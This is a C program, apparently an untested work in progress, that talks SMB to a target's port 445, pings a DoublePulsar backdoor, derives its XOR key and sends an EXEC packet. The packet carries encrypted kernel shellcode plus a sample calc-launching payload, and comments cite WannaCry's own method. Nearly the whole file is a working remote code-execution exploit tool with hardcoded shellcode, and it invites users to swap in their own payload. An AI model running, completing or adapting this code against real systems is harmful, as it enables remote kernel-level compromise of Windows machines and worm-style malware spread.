#define _CRT_SECURE_NO_WARNINGS
/*
11/8/2021: Code is still untested
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,"wsock32.lib")

/* Unsigned.  */
typedef unsigned char                uint8_t;
typedef unsigned short int        uint16_t;
typedef unsigned int                uint32_t;

#pragma pack(1)
typedef struct TreeConnect_Response {
	uint16_t SmbMessageType;
	uint16_t SmbMessageLength;
	uint8_t ProtocolHeader[4];
	uint8_t SmbCommand;
	uint32_t NtStatus;
	uint8_t flags;
	uint16_t flags2;
	uint16_t ProcessIDHigh;
	uint8_t signature[8];
	uint16_t reserved;
	uint16_t TreeId;
	uint16_t ProcessID;
	uint16_t UserID;
	uint16_t multipleID;

	//TreeConnectStuff
	uint8_t WordCount;
	uint8_t AndXCommand;
	uint8_t reserved2;
	uint16_t AndXOffset;
	uint16_t reserved3;
	uint32_t maximal_share;
	uint32_t guest_share;

	//uint16_t WordCount2;
	uint16_t ByteCount;
	uint32_t IPC;
	uint16_t NativeOS;

};

#pragma pack(1)
typedef struct SMB_DOUBLEPULSAR_PING{
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags = 0x18; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	//trans2 stuff
	uint8_t wordCount;              //setupcount(1) + wordcount (14)
	uint16_t totalParameterCount;
	uint16_t totalDataCount;
	uint16_t MaxParameterCount;
	uint16_t MaxDataCount;
	uint8_t MaxSetupCount;

	uint8_t reserved1;
	uint16_t flags1;
	uint32_t timeout;
	uint16_t reserved2;

	uint16_t ParameterCount;
	uint16_t ParamOffset;

	uint16_t DataCount;
	uint16_t DataOffset;
	uint8_t SetupCount;

	uint8_t reserved3;
	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
	uint8_t padding;

	char SESSION_SETUP_PARAMETERS[12]; //Wannacry uses 12 as the size but need NULL terminator
};

#pragma pack(1)
typedef struct SMB_DOUBLEPULSAR_REQUEST {
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags = 0x18; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	//trans2 stuff
	uint8_t wordCount;              //setupcount(1) + wordcount (14)
	uint16_t totalParameterCount;
	uint16_t totalDataCount;
	uint16_t MaxParameterCount;
	uint16_t MaxDataCount;
	uint8_t MaxSetupCount;

	uint8_t reserved1;
	uint16_t flags1;
	uint32_t timeout;
	uint16_t reserved2;

	uint16_t ParameterCount;
	uint16_t ParamOffset;

	uint16_t DataCount;
	uint16_t DataOffset;
	uint8_t SetupCount;

	uint8_t reserved3;
	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
	uint8_t padding;

	//may need to be merged into 1 buffer of 4108, 0-12 is the parameters, 13-4108 is the encrypted XOR data
	char SESSION_SETUP_PARAMETERS[12];
	char SMB_DATA[4096];
};


unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

//Fixed Trans2 session setup PING packet.  This should work
unsigned char trans2_request[] =
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00";

//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
unsigned char wannacry_Trans2_Request[] =
"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
"\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
"\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */

#define byteswap16(value)		\
((WORD)((((value) >> 8) & 0xFF) | (((value) & 0xFF) << 8)))
#define byteswap32(value)		\
((((value) & 0xFF000000) >> 24) | (((value) & 0x00FF0000) >> 8) | (((value) & 0xFF00) << 8) | (((value) & 0xFF) << 24))
#define byteswap64(value)		\
((((value) & 0xFF00000000000000ULL) >> 56)		\
|	(((value) & 0x00FF000000000000ULL) >> 40)	\
|	(((value) & 0x0000FF0000000000ULL) >> 24)	\
|	(((value) & 0x000000FF00000000ULL) >> 8)	\
|	(((value) & 0x00000000FF000000ULL) << 8)	\
|	(((value) & 0x0000000000FF0000ULL) << 24)	\
|	(((value) & 0x000000000000FF00ULL) << 40)	\
|	(((value) & 0x00000000000000FFULL) << 56))


#define GetUlong(src)			\
*(DWORD *)(src)

#define GetUlonglong(src)		\
*(ULONGLONG*)(src)

#define PutUlonglong(dest, value)	\
*(ULONGLONG *)(dest) = (value)

ULONGLONG ComputeDOUBLEPULSARXorKey(ULONGLONG sig)
{
	ULONGLONG x = 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
		(((sig << 16) | sig & 0xFF00) << 8));
	x = x & 0xffffffff;
	return x;
}

void convert_name(char* out, char* name)
{
	unsigned long len;
	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

int xor_payload(long xor_key, unsigned char* buf, int size)
{
	int i;
	char __xor_key[5];
	i = 0;
	*&__xor_key[1] = 0;
	*__xor_key = xor_key;
	if (size <= 0)
		return 0;
	do
	{
		*(i + buf) ^= __xor_key[i % 4];
		++i;
	} while (i < size);
	return 0;
}


#define MAKEUNSIGNED(x)		\
((unsigned)(x))

#define SWAP_WORD(X) (((((uint32_t)(X)) >> 24) & 0x000000ff) | \
				((((uint32_t)(X)) >>  8) & 0x0000ff00) | \
							 ((((uint32_t)(X)) <<  8) & 0x00ff0000) | \
							 ((((uint32_t)(X)) << 24) & 0xff000000))

#define SWAP_SHORT(X) ( ((((uint16_t)X)& 0xff00) >> 8) | ((((uint16_t)X)& 0x00ff) << 8) )

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);

	//Generates a new TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char* ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char*)tmp, "\\\\%s\\IPC$", argv[1]);
	convert_name((char*)ptr, (char*)tmp);
	smblen = strlen((char*)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet

	//send modified TreeConnect request
	send(sock, (char*)packet, ptr - packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy the treeID from the TreeConnect response
	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid

	TreeConnect_Response* resp = (TreeConnect_Response*)recvbuff;
	printf("resp->User ID:  0x%04hX\n", resp->UserID);
	printf("user from recvbuff:  0x%04hX\n", userid);

	/////
	//NOW PING PACKET
		//set SMB values
	SMB_DOUBLEPULSAR_PING pingpacket;
	pingpacket.SmbMessageType = 0x0000;
	pingpacket.ProtocolHeader[0] = '\xff';
	pingpacket.ProtocolHeader[1] = 'S';
	pingpacket.ProtocolHeader[2] = 'M';
	pingpacket.ProtocolHeader[3] = 'B';
	pingpacket.SmbCommand = 0x32; //Trans2 
	pingpacket.SmbMessageLength = SWAP_SHORT(0x4e);
	pingpacket.ProcessIDHigh = 0x0000;
	pingpacket.NtStatus = 0x00000000;
	pingpacket.flags = 0x18;
	pingpacket.flags2 = 0xc007;
	pingpacket.UserID = userid;  //works when we copy the recvbuff response to a WORD userid.
	//Treeresponse structure sucks and probably will be removed later.
	/* BUG HERE: treeresponse.UserID comes back as corrupted for some reason
	  this needs to be treeresponse.UserID;
		Will return later to this later. But currently works if both values are the same
	This is not always the case and this will need to be fixed later.  */
	pingpacket.reserved = 0x0000;
	pingpacket.ProcessID = 0xfeff; //treeresponse.ProcessID;        //treeresponse.ProcessID; //Default value:  0xfeff;
	pingpacket.TreeId = resp->TreeId;				//grab from SMB response
	pingpacket.multipleID = 0x41;

	//trans2 packet stuff
	pingpacket.wordCount = 15; // 0x0F == 15 
	pingpacket.totalParameterCount = 0x0C; // should be 12
	pingpacket.totalDataCount = SWAP_SHORT(0x0000); // should be 0

	pingpacket.MaxParameterCount = SWAP_SHORT(0x0100); // should be 1
	pingpacket.MaxDataCount = SWAP_SHORT(0x0000); // should be 0
	pingpacket.MaxSetupCount = 0x00;  //OLD VALUE:  SWAP_SHORT(0);     //should be 0
	pingpacket.reserved1 = 0x00; //OLD value: SWAP_SHORT(0);
	pingpacket.flags1 = 0x0000;

	//trying little endian format for timeout
	//pingpacket.timeout = SWAP_WORD(0x001a8925); //0x25 0x89 0x1a 0x00 EXEC command
	pingpacket.timeout = SWAP_WORD(0xa6d9a400);    //little endian PING command
	//0x866c3100 = PING command from somewhere else

	pingpacket.reserved2 = SWAP_SHORT(0x0000);                 //should be 0x0000
	pingpacket.ParameterCount = 0x0C;         //should be 12
	pingpacket.ParamOffset = 0x0042;          //should be 66
	pingpacket.DataCount = SWAP_SHORT(0x0000);          //should be 0 -> 0x0000
	pingpacket.DataOffset = 0x004e;           //should be 78
	pingpacket.SetupCount = 0x1;	//old value: 1					//should be 1 / 0x01
	pingpacket.reserved3 = 0x00;						//should be 0x00
	pingpacket.subcommand = SWAP_SHORT(0x0e00);         //original 0x0e00 ( little endian format )
	pingpacket.ByteCount = SWAP_SHORT(0x0D00);          //value should be 13
	pingpacket.padding = SWAP_SHORT(0x00);			//should be 0x00
	pingpacket.signature[0] = 0x00; //old value: '\0';
	pingpacket.signature[1] = 0x00; //old value: '\0';
	pingpacket.signature[2] = 0x00; //old value: '\0';
	pingpacket.signature[3] = 0x00; //old value: '\0';
	pingpacket.signature[4] = 0x00; //old value: '\0';
	pingpacket.signature[5] = 0x00; //old value: '\0';
	pingpacket.signature[6] = 0x00; //old value: '\0';
	pingpacket.signature[7] = 0x00; //old value: '\0';

	pingpacket.SESSION_SETUP_PARAMETERS[0] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[1] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[2] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[3] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[4] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[5] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[6] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[7] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[8] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[9] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[10] = 0x00; //old value: '\0';
	pingpacket.SESSION_SETUP_PARAMETERS[11] = 0x00; //old value: '\0';

	send(sock, (char*)&pingpacket, sizeof(pingpacket), 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	SMB_DOUBLEPULSAR_PING* trans2_smb_response = (SMB_DOUBLEPULSAR_PING*)recvbuff;

	//EXEC Packet

	ULONGLONG s = 0;

	s = byteswap64(GetUlonglong(trans2_smb_response->signature));
	s = GetUlonglong(trans2_smb_response->signature);
	unsigned long XorKey = ComputeDOUBLEPULSARXorKey(s);
	printf("Your hex key is:  0x%X\n", XorKey);

	/*
	https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm
	Name: kernel
	Length: 1019 bytes

	Requires a userland payload size length to be added at the end
	*/

	//1011 bytes
	unsigned char kernel_shellcode[] =
		"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
		"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
		"\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10"
		"\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x50\x53\x51\x52"
		"\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41"
		"\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10\x00\x00\x00\x41\x53\x6A"
		"\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55\x48\x81\xEC\x58\x01\x00"
		"\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48\x89\x9D\xC0\x00\x00\x00"
		"\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5\xD0\x00\x00\x00\x48\xA1"
		"\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89\xC2\x48\xC1\xEA\x20\x48"
		"\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00\x00\xC0\x0F\x30\xFB\xE8"
		"\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x48\x83"
		"\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59"
		"\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65\x48\x8B\x24\x25\x10\x00"
		"\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F\xD0\xFF\x56\x41\x57\x41"
		"\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5\x66\x83\xE4\xF0\x48\x83"
		"\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65\x4C\x8B\x3C\x25\x38\x00"
		"\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C\x49\xC1\xE7\x0C\x49\x81"
		"\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81\xFE\x4D\x5A\x75\xEF\x41"
		"\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00\x48\x89\xC6\x48\x81\xC6"
		"\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30\xE8\x03\x02\x00\x00\x48"
		"\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90\x00\x05\x00\x00\x48\x39"
		"\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B\x36\x48\x39\xCE\x75\xE2"
		"\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04\x81\xF9\x00\x00\x01\x00"
		"\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89\xCB\x41\xBB\x66\x55\xA2"
		"\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB\x49\x8B\x0E\x41\xBB\xA3"
		"\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89\xC6\xE8\x50\x01\x00\x00"
		"\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49\x8B\x1E\x4D\x8D\x6E\x10"
		"\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24\x11\xDC\xE8\x81\x01\x00"
		"\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D\x4E\x08\x49\xC7\x01\x00"
		"\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31\xC9\x48\x89\x0A\x48\xF7"
		"\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC\x20\xE8\x52\x01\x00\x00"
		"\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B\x3E\x48\x8D\x35\xE9\x00"
		"\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00\x00\x66\x81\xC1\xF9\x00"
		"\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03\x00\x00\x48\x89\xF1\x48"
		"\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1\x48\x83\xEC\x20\x41\xBB"
		"\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48\x83\xC4\x20\x5A\x59\x48"
		"\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00\x00\x48\x85\xC0\x74\x0C"
		"\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05\x72\x05\x48\x8B\x09\xEB"
		"\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2\x80\xC2\x90\x31\xC9\x41"
		"\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00\x48\x89\xC1\x4C\x8D\x89"
		"\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89\xE2\x49\x89\xC4\x4D\x31"
		"\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41\x50\x48\x83\xEC\x20\x41"
		"\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00\x31\xD2\x52\x52\x41\x58"
		"\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09\x9E\xE8\x82\x00\x00\x00"
		"\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8\x74\x00\x00\x00\x48\x89"
		"\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00\x00\x00\x48\x89\xEC\x5D"
		"\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E\xC3\xE9\xB5\x00\x00\x00"
		"\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D\x3C\x61\x7C\x02\x2C\x20"
		"\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2\x65\x48\x8B\x52\x60\x48"
		"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12\x48\x8B\x72\x50\x48\x0F"
		"\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41"
		"\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39\xD9\x75\xDA\x4C\x8B\x7A"
		"\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52\x51\x56\x48\x89\xC2\x8B"
		"\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x01\xD0\x50\x8B"
		"\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48\xFF\xC9\x41\x8B\x34\x88"
		"\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39\xD9\x75\xEC\x58\x44\x8B"
		"\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01"
		"\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59\x5A\x41\x58\x41\x59\x41"
		"\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48\x89\xE5\x48\x83\xEC\x20"
		"\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF\xFF\x31\xC9\x51\x51\x51"
		"\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x20\x41"
		"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
		"\x5E\xC3";

	//pop calculator shellcode - this is a sample.  Change according to your payload
	unsigned char shellcode[] =
		"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
		"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
		"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
		"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
		"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
		"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
		"\x45\x81\x3e\x43\x72\x65\x61\x75"
		"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
		"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
		"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
		"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
		"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
		"\x6c\x63\x89\xe2\x52\x52\x53\x53"
		"\x53\x53\x53\x53\x52\x53\xff\xd7";

	//might need to make this static due to sizeof being garbage @ counting shellcode
	unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
	unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);
	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size;

	//allocate memory for encrypted shellcode payload buffer
	unsigned char* encrypted;
	encrypted = (unsigned char*)malloc(4096 + 1);

	//initialize to 0
	memset((unsigned char*)encrypted, 0x00, 4096);

	//copy kernel shellcode to encrypted buffer
	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);

	//add the payload shellcode length after the kernel shellcode
	WORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, sizeof(WORD));

	//copy payload shellcode to encrypted buffer
	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (unsigned char*)&shellcode, payload_shellcode_size);

	//Xor the data buffer with the calculated key
	xor_payload(XorKey, (unsigned char*)encrypted, 4096);

	SMB_DOUBLEPULSAR_REQUEST execpacket;
	execpacket.SmbMessageType = 0x0000;
	execpacket.ProtocolHeader[0] = '\xff';
	execpacket.ProtocolHeader[1] = 'S';
	execpacket.ProtocolHeader[2] = 'M';
	execpacket.ProtocolHeader[3] = 'B';
	execpacket.SmbCommand = 0x32; //Trans2 
	execpacket.SmbMessageLength = 0x104e;
	execpacket.ProcessIDHigh = 0x0000;
	execpacket.NtStatus = 0x00000000;
	execpacket.flags = 0x18;
	execpacket.flags2 = 0xc007;
	execpacket.UserID = userid;  //works when we copy the recvbuff response to a WORD userid.

	execpacket.reserved = 0x0000;
	execpacket.ProcessID = 0xfeff; //treeresponse.ProcessID;        //treeresponse.ProcessID; //Default value:  0xfeff;
	execpacket.TreeId = treeid; //resp->TreeId				//grab from SMB response
	execpacket.multipleID = 0x42;

	//trans2 packet stuff
	execpacket.wordCount = 0x0F; // 0x0F == 15 
	execpacket.totalParameterCount = 0x0C; // should be 12
	execpacket.totalDataCount = 0x1000;

	execpacket.MaxParameterCount = 0x0001; // should be 1
	execpacket.MaxDataCount = 0x0000; // should be 0
	execpacket.MaxSetupCount = 0x00; // old value: SWAP_SHORT(0);     //should be 0
	execpacket.reserved1 = 0x00; //old value: SWAP_SHORT(0);
	execpacket.flags1 = 0x0000;

	//trying little endian format for timeout
	//execpacket.timeout = SWAP_WORD(0x001a8925); //0x25 0x89 0x1a 0x00 EXEC command
	execpacket.timeout = 0x2589a100; //0x25 0x89 0x1a 0x00 EXEC command

	execpacket.reserved2 = 0x0000;                 //should be 0x0000
	execpacket.ParameterCount = 0x0C;         //should be 12
	execpacket.ParamOffset = 0x0042;          //should be 66
	execpacket.DataCount = 0x1000;          //should be 
	execpacket.DataOffset = 0x004e;           //should be 78
	execpacket.SetupCount = 0x1;		//OLD VALUE: 1				//should be 1 / 0x01
	execpacket.reserved3 = 0x00;						//should be 0x00
	execpacket.subcommand = 0x000e;         //original 0x0e00 ( little endian format )
	execpacket.ByteCount = 0x100D;          //value should be 13
	execpacket.padding = 0x00;			//should be 0x00
	execpacket.signature[0] = 0x00; //old value: '\0';
	execpacket.signature[1] = 0x00; //old value: '\0';0x00; //old value: '\0';
	execpacket.signature[2] = 0x00; //old value: '\0';
	execpacket.signature[3] = 0x00; //old value: '\0';
	execpacket.signature[4] = 0x00; //old value: '\0';
	execpacket.signature[5] = 0x00; //old value: '\0';
	execpacket.signature[6] = 0x00; //old value: '\0';
	execpacket.signature[7] = 0x00; //old value: '\0';

	//Wannacry implementation - generate the SESSION_SETUP parameters
	//copy values to parameters buffer then XOR it
	unsigned int B4_XOR_TotalSizeOfPayload = EntireShellcodeSize;
	unsigned int B4_XOR_ChunkSize = 4096;
	unsigned int B4_XOR_OffsetofChunkinPayload = 0;
	unsigned char* B4_XOR_Parametersbuffer[12];

	//Old way of doing this
	  //generate the SESSION_SETUP parameters here 
	  /*
	  unsigned int TotalSizeOfPayload = EntireShellcodeSize ^ XorKey;
	  unsigned int ChunkSize = 4096 ^ XorKey;
	  unsigned int OffsetofChunkinPayload = 0 ^ XorKey;
	  char Parametersbuffer[12];
	//copy XOR values to parameters buffer
	  memcpy((char*)Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
	  memcpy((char*)Parametersbuffer + 4, (char*)&ChunkSize, 4);
	  memcpy((char*)Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
	  xor_payload(XorKey, execpacket.Parametersbuffer, 12);*/

	memcpy((unsigned char*)B4_XOR_Parametersbuffer, (char*)&B4_XOR_TotalSizeOfPayload, 4);
	memcpy((unsigned char*)B4_XOR_Parametersbuffer + 4, (char*)&B4_XOR_ChunkSize, 4);
	memcpy((unsigned char*)B4_XOR_Parametersbuffer + 8, (char*)&B4_XOR_OffsetofChunkinPayload, 4);
	xor_payload(XorKey, (unsigned char*)B4_XOR_Parametersbuffer, 12);
	memcpy((unsigned char*)execpacket.SESSION_SETUP_PARAMETERS, (unsigned char*)B4_XOR_Parametersbuffer, 12);
	memcpy((unsigned char*)execpacket.SMB_DATA, (unsigned char*)encrypted, 4096);

	send(sock, (char*)&execpacket, sizeof(execpacket), 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	free(encrypted);

	closesocket(sock);
	WSACleanup();
	return 0;
}
